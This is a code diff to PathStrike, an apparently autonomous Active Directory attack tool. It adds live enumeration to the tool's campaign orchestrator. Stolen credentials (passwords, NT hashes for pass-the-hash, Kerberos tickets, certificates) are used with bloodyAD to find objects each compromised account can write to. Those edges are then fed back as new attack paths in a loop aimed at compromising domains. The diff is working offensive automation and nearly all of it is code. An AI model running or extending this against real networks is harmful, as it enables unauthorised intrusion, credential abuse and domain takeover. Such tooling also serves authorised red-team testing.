@@ -29,6 +29,7 @@ from pathstrike.bloodhound.cypher import (
     build_shortest_path_to_target_query,
     build_trust_map_query,
 )
+from pathstrike.engine.capability_graph import CapabilityGraph
 from pathstrike.bloodhound.parser import parse_cypher_response
 from pathstrike.config import PathStrikeConfig
 from pathstrike.engine.credential_store import CredentialStore
@@ -48,6 +49,31 @@ from pathstrike.models import (
 
 logger = logging.getLogger("pathstrike.engine.campaign")
 console = Console()
+
+
+def _dn_to_bh_name(dn: str, domain: str) -> str | None:
+    """Convert an LDAP distinguishedName to BH CE's ``NAME@DOMAIN`` format.
+
+    BH CE stores User/Group/Computer nodes with a canonical ``name``
+    property of ``SAMACCOUNTNAME@DOMAIN.FQDN`` (upper-cased).  We
+    approximate by taking the first RDN's CN value.  Returns ``None``
+    when the DN doesn't start with a CN= component (e.g. DNS records,
+    container objects, ForeignSecurityPrincipals that have SIDs as CN).
+
+    This is a best-effort conversion — for computer accounts the BH
+    name may be ``COMPUTER.DOMAIN`` rather than ``COMPUTER@DOMAIN``
+    depending on how SharpHound collected it.  Callers should treat
+    lookup mismatches as "no equivalent BH node" and skip.
+    """
+    if not dn:
+        return None
+    first = dn.split(",", 1)[0].strip()
+    if not first.upper().startswith("CN="):
+        return None
+    name = first[3:].strip()
+    if not name:
+        return None
+    return f"{name.upper()}@{domain.upper()}"
 
 
 class CampaignOrchestrator:
@@ -89,6 +115,16 @@ class CampaignOrchestrator:
         self.failed_paths: list[ScoredPath] = []
         self.domains_compromised: set[str] = set()
         self._captured_creds: list[dict[str, str]] = []
+
+        # Live-enum capability graph (Option A): populated after each
+        # successful compromise with edges discovered by bloodyAD /
+        # direct LDAP queries.  Consulted alongside BH CE during
+        # discovery to surface newly-reachable targets that BH's
+        # static snapshot doesn't know about.
+        self.capability_graph = CapabilityGraph()
+        # Track which identities we've already run live-enum for in this
+        # session so we don't re-query on every round.
+        self._enumerated_identities: set[str] = set()
 
     async def run_campaign(self) -> CampaignResult:
         """Execute the autonomous campaign loop.
@@ -221,6 +257,12 @@ class CampaignOrchestrator:
                     # (e.g. after compromising MANAGEMENT group via Judith's
                     # WriteOwner, next round queries from MANAGEMENT's POV).
                     self._claim_path_nodes_as_owned(scored_path)
+
+                    # Live-enum any newly-owned identity so edges that
+                    # BH CE's snapshot doesn't reflect (e.g. writeables
+                    # we inherited via a group membership added during
+                    # the current campaign) are discoverable next round.
+                    await self._enumerate_live_capabilities()
 
                     # Check if we compromised a domain
                     self._check_domain_compromise(scored_path)
@@ -423,12 +465,83 @@ class CampaignOrchestrator:
             except Exception as exc:
                 logger.debug("No path to %s: %s", target_name, exc)
 
+        # Also surface any edges discovered via live enumeration
+        # (CapabilityGraph) that aren't already represented as BH paths.
+        # These become single-hop synthetic AttackPath objects.
+        live_paths = self._build_paths_from_capability_graph(identity)
+        if live_paths:
+            # Dedup by target name — prefer BH paths (multi-hop, known
+            # edge metadata) over single-hop synthetic ones.
+            bh_targets = {p.target.name for p in all_paths}
+            for sp in live_paths:
+                if sp.target.name not in bh_targets:
+                    all_paths.append(sp)
+
         logger.info(
             "Discovered %d reachable path(s) from %s "
-            "(%d targets enumerated, %d pseudo-principals filtered)",
+            "(%d targets enumerated, %d pseudo-principals filtered, "
+            "%d from live-enum)",
             len(all_paths), identity, len(target_names), pseudo_count,
+            len(live_paths),
         )
         return all_paths
+
+    def _build_paths_from_capability_graph(
+        self, identity: str,
+    ) -> list[AttackPath]:
+        """Turn CapabilityGraph edges for *identity* into single-hop AttackPaths.
+
+        The returned paths are 1-step ``AttackPath`` instances whose
+        ``edge_type`` matches a registered Pathstrike handler so the
+        existing orchestrator can exploit them without special-casing.
+        Synthesised ``NodeInfo`` / ``EdgeInfo`` objects have empty
+        ``object_id`` / ``domain`` fields — they're best-effort and
+        will miss any handler logic that reads those attributes.
+        """
+        from pathstrike.models import EdgeInfo, NodeInfo, PathStep
+
+        edges = self.capability_graph.get_outbound(identity)
+        if not edges:
+            return []
+
+        paths: list[AttackPath] = []
+        domain = self.config.domain.name
+        for cap_edge in edges:
+            # Don't re-surface edges we've already completed / exploited.
+            if cap_edge.target in self.completed_targets:
+                continue
+            if self._is_well_known_principal(cap_edge.target):
+                continue
+
+            source_node = NodeInfo(
+                object_id="", name=cap_edge.source,
+                label="User", domain=domain, properties={},
+            )
+            target_node = NodeInfo(
+                object_id="", name=cap_edge.target,
+                label="User", domain=domain, properties={},
+            )
+            edge = EdgeInfo(
+                edge_type=cap_edge.edge_type,
+                source=source_node,
+                target=target_node,
+                properties={"discovered_via": cap_edge.source_method},
+            )
+            step = PathStep(
+                index=0,
+                edge=edge,
+                handler_name=None,
+                status="pending",
+                result=None,
+            )
+            paths.append(
+                AttackPath(
+                    steps=[step],
+                    source=source_node,
+                    target=target_node,
+                )
+            )
+        return paths
 
     async def _discover_trust_escalation(self) -> list[AttackPath]:
         """Check for trust edges from compromised domains.
@@ -617,6 +730,139 @@ class CampaignOrchestrator:
             if identity not in self.owned_identities:
                 self.owned_identities.add(identity)
                 logger.info("New identity captured: %s", identity)
+
+    async def _enumerate_live_capabilities(self) -> None:
+        """Run ``bloodyAD get writable`` per owned human/service identity.
+
+        Each newly-owned principal (that we haven't enumerated yet in
+        this campaign) is queried for its effective writeable objects.
+        Results are added to :attr:`capability_graph` as edges, which
+        :meth:`_discover_reachable_paths` then consults alongside BH CE.
+
+        Scope of this first implementation (Phase 3A):
+        * Only standard ACE writes (WRITE / OWN / WRITE_OWNER / WRITE_DACL).
+        * Does NOT cover extended rights (AddSelf, ForceChangePassword,
+          ReadGMSAPassword, ReadLAPSPassword) or DCSync — a direct LDAP
+          ACL scanner in Phase 3B will fill that in.
+        * Only user/computer identities with credentials in the store
+          (groups can't authenticate; their rights surface via user
+          memberships).
+        """
+        from pathstrike.tools.bloodyad_wrapper import get_writable
+
+        domain = self.config.domain.name
+
+        for identity in self.owned_identities:
+            if identity in self._enumerated_identities:
+                continue
+
+            # Strip @DOMAIN to get sAMAccountName for credential lookup.
+            if "@" in identity:
+                user_part, _, id_domain = identity.partition("@")
+            else:
+                user_part = identity
+                id_domain = domain
+
+            # Only attempt enumeration for identities we can authenticate
+            # as — skip Groups / pseudo-principals / anything without a
+            # credential in the store.
+            cred = self.cred_store.get_best_credential(user_part, id_domain)
+            if cred is None:
+                logger.debug(
+                    "live-enum: no credential for %s; skipping", identity,
+                )
+                self._enumerated_identities.add(identity)
+                continue
+
+            auth_args = self._build_auth_args_for_identity(user_part, id_domain)
+            if not auth_args:
+                self._enumerated_identities.add(identity)
+                continue
+
+            logger.info("Live-enum: querying writeables as %s", identity)
+            try:
+                result = await get_writable(self.config, auth_args)
+            except Exception as exc:
+                logger.debug("Live-enum failed for %s: %s", identity, exc)
+                self._enumerated_identities.add(identity)
+                continue
+
+            self._enumerated_identities.add(identity)
+
+            if not result.get("success"):
+                logger.debug(
+                    "Live-enum returned no data for %s: %s",
+                    identity, result.get("error", "unknown"),
+                )
+                continue
+
+            parsed = result.get("parsed") or {}
+            entries = parsed.get("writable_targets", []) or []
+
+            added = 0
+            for entry in entries:
+                dn = entry.get("dn")
+                edge_type = entry.get("edge_type")
+                if not dn or not edge_type:
+                    continue
+                target_name = _dn_to_bh_name(dn, domain)
+                if not target_name:
+                    continue
+                # Skip self-writes (writing to your own account doesn't
+                # help escalation) and SIDs (Foreign Security Principals).
+                if target_name == identity:
+                    continue
+                short = target_name.split("@", 1)[0]
+                if short.startswith("S-") and all(
+                    c.isdigit() or c == "-" for c in short[1:]
+                ):
+                    continue
+                if self.capability_graph.add_edge(
+                    source=identity,
+                    edge_type=edge_type,
+                    target=target_name,
+                    source_method="bloodyad:get-writable",
+                ):
+                    added += 1
+
+            if added:
+                logger.info(
+                    "Live-enum: added %d new edge(s) from %s to capability graph",
+                    added, identity,
+                )
+            else:
+                logger.debug(
+                    "Live-enum: no new exploitable edges for %s", identity,
+                )
+
+    def _build_auth_args_for_identity(
+        self, user: str, domain: str,
+    ) -> list[str]:
+        """Assemble bloodyAD auth args for a specific owned identity.
+
+        Mirrors BaseEdgeHandler._auth_args_from_credential but operates
+        from the orchestrator's point of view (no handler instance) —
+        the credential store lookup is the same.
+        """
+        from pathstrike.models import CredentialType
+
+        cred = self.cred_store.get_best_credential(user, domain)
+        if cred is None:
+            return []
+
+        args: list[str] = ["-u", cred.username]
+        match cred.cred_type:
+            case CredentialType.password:
+                args.extend(["-p", cred.value])
+            case CredentialType.nt_hash:
+                args.extend(["-p", f":{cred.value}"])
+            case CredentialType.aes_key | CredentialType.ccache:
+                args.extend(["-k", "--dc-ip", self.config.domain.dc_host])
+            case CredentialType.certificate:
+                args.extend(["-c", cred.value])
+            case _:
+                return []
+        return args
 
     def _claim_path_nodes_as_owned(self, scored: ScoredPath) -> None:
         """Mark every node in a successfully-exploited path as owned.
